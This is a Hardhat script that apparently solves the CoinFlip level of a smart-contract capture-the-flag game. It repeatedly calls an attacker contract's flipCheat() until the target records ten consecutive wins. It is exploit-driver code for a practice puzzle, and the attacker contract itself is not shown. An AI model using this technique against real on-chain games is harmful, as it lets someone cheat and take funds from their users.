// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
import { ethers } from "hardhat";
import contractAddresses from "../constants/contractAddresses.json";

const PLAYER_ADDRESS = contractAddresses.Player;

const COINFLIPADDRESS = contractAddresses.CoinFLip;
const COINFLIPATTACKERADDRESS = contractAddresses.CoinFlipAttacker;

async function main() {
    console.log("Script to solve CoinFlip puzzle \n ========================================== \n");

    const attacker = await ethers.getSigner(PLAYER_ADDRESS);
    const contract = await ethers.getContractAt("CoinFlip", COINFLIPADDRESS, attacker);
    const attackerContract = await ethers.getContractAt(
        "CoinFlipAttacker",
        COINFLIPATTACKERADDRESS,
        attacker
    );

    let wins;
    while (true) {
        wins = await contract.consecutiveWins();
        await attackerContract.flipCheat();

        console.log(`There is ${wins} consecutive wins`);
        if (wins.toNumber() >= 10) {
            break;
        }
    }
    console.log("Congratulations! Now submit the solution");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
